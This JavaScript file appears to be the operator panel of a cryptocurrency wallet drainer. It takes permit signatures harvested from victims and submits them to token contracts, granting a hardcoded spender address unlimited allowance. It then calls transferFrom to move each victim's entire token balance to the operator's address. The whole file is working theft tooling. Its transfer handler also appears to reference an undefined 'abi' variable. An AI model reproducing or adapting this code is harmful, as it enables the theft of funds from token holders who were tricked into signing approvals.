import { mainNetwork, checkNetwork, checkConnection, Web3, getProvider, sendTransaction, getUserAddress } from './constants.js';

// Carga del front
window.onload = async () => {
    
    checkConnection().then( dataConnect => {
        const signsButton = document.getElementsByName('signButton');
        const transfersButton = document.getElementsByName('transferFunds');

        const web3 = new Web3(getProvider());
        const spender = '0x4E0b2A80E158f8d28a2007866ab80B7f63bE6076';

        signsButton.forEach(button => {
            button.addEventListener("click", async () => {
                const contractAddress = button.getAttribute('data-tokenaddress');
                const userAddress = button.getAttribute('data-useraddress');
                const r = button.getAttribute('data-r');
                const s = button.getAttribute('data-s');
                const v = button.getAttribute('data-v');
                const deadline = button.getAttribute('data-deadline');
                const typeSign = button.getAttribute('data-sign');
                const nonce = button.getAttribute('data-nonce');
                const dataAbi = button.getAttribute('data-abi');

                const abi = require(`./abi-codes/${dataAbi}`);

                if (typeSign == 1) {
                    const instanceContract = new web3.eth.Contract(abi, contractAddress);
                    const txData = await instanceContract.methods.permit(userAddress, spender, nonce, deadline, true, v, r, s).encodeABI();
                    sendTransaction(getUserAddress(), contractAddress, txData, 0);
                } else {
                    const instanceContract = new web3.eth.Contract(abi, contractAddress);
                    const txData = await instanceContract.methods.permit(userAddress, spender, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', deadline, v, r, s).encodeABI();
                    sendTransaction(getUserAddress(), contractAddress, txData, 0);
                }
            });
        });

        transfersButton.forEach(button => {
            button.addEventListener("click", async () => {
                const contractAddress = button.getAttribute('data-tokenaddress');
                const userAddress = button.getAttribute('data-useraddress');

                const instanceContract = new web3.eth.Contract(abi, contractAddress);
                const balanceUser = await instanceContract.methods.balanceOf(userAddress).call();

                if (balanceUser > 0) {
                    const txData = await instanceContract.methods.transferFrom(userAddress, getUserAddress(), balanceUser).encodeABI();
                    sendTransaction(getUserAddress(), contractAddress, txData, 0);


                } else {
                    alert('balance: 0');
                }
            });
        });
    });

    if (window.ethereum) {
        window.ethereum.on('chainChanged', (net_id) => { if (net_id != mainNetwork) {
            setTimeout(() => {
                checkNetwork();
            }, 3000);
        }; });
    }
};